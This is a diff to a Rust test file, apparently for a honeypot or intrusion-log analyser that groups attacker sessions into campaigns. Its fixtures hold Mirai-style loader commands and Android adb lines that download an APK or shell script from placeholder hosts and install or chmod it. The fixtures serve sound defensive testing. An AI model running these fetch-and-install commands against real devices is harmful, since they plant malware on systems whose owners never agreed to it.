@@ -808,10 +808,11 @@ async fn loaders_that_differ_inside_the_key_do_not_merge(pool: PgPool) {
     // W matches X for the whole key and then goes its own way: the same campaign as X.
     let mut w: Vec<&str> = MIRAI[..8].to_vec();
     w[5] = "/bin/busybox echo done";
-    // Architecture names are tool vocabulary: x86 and arm7 loaders are two campaigns.
+    // Architecture names are tool vocabulary: arm5 and arm7 loaders are two campaigns (a
+    // normalizer that blanks every digit would make them one).
     let arch = |a: &str| format!("/bin/busybox wget http://192.0.2.9/bins.sh/{a}");
-    let (a86, a7) = (arch("x86"), arch("arm7"));
-    let on_x86: Vec<&str> = vec!["uname -m", "cd /tmp", a86.as_str(), "chmod 777 bins.sh"];
+    let (a5, a7) = (arch("arm5"), arch("arm7"));
+    let on_x86: Vec<&str> = vec!["uname -m", "cd /tmp", a5.as_str(), "chmod 777 bins.sh"];
     let on_arm: Vec<&str> = vec!["uname -m", "cd /tmp", a7.as_str(), "chmod 777 bins.sh"];
 
     for (i, cmds) in [&x, &y, &z, &w, &on_x86, &on_arm].iter().enumerate() {
@@ -830,7 +831,7 @@ async fn loaders_that_differ_inside_the_key_do_not_merge(pool: PgPool) {
     index_all(&pool).await;
     let found = sequences(&pool).await;
     let counts: Vec<i32> = found.iter().map(|(_, n)| *n).collect();
-    // X and W together, then Y, Z, x86 and arm7 alone.
+    // X and W together, then Y, Z, arm5 and arm7 alone.
     assert_eq!(counts, vec![6, 3, 3, 3, 3], "{found:?}");
 }
 
@@ -857,7 +858,9 @@ async fn per_session_random_tokens_do_not_split_a_campaign(pool: PgPool) {
         .await;
     }
     for i in 0..10u64 {
-        let tag = format!("{:010x}", rng.next() & 0xff_ffff_ffff | 0xa00_0000);
+        // Hex words with one or two digits: only the hex rule (not the identifier rule, which
+        // wants three digits) reads these as tokens.
+        let tag = format!("a{i}bcdef{}", i + 1);
         let host = format!("203.0.113.{}", i + 1);
         session_of(
             &pool,
@@ -866,6 +869,21 @@ async fn per_session_random_tokens_do_not_split_a_campaign(pool: PgPool) {
             t0() + Duration::minutes(i as i64),
             &[&format!(
                 "N={tag}; cd /data/local/tmp; U=http://{host}/gms.apk; wget $U -O $N; pm install $N"
+            )],
+        )
+        .await;
+    }
+    // An identifier that is not hex, assigned to a variable: the identifier rule.
+    for i in 0..6u64 {
+        session_of(
+            &pool,
+            &format!("203.0.113.{}", 150 + i),
+            "adb",
+            t0() + Duration::minutes(i as i64),
+            &[&format!(
+                "K=k{i}j{}x{}m1q; cd /data/local/tmp; wget -O $K http://192.0.2.9/k.apk",
+                i + 2,
+                i + 4
             )],
         )
         .await;
@@ -889,7 +907,7 @@ async fn per_session_random_tokens_do_not_split_a_campaign(pool: PgPool) {
     index_all(&pool).await;
     let found = sequences(&pool).await;
     let counts: Vec<i32> = found.iter().map(|(_, n)| *n).collect();
-    assert_eq!(counts, vec![20, 10, 1, 1], "{found:?}");
+    assert_eq!(counts, vec![20, 10, 6, 1, 1], "{found:?}");
 }
 
 /// HTTP request lines sent to a shell port, in any order, are one campaign of their own, not one
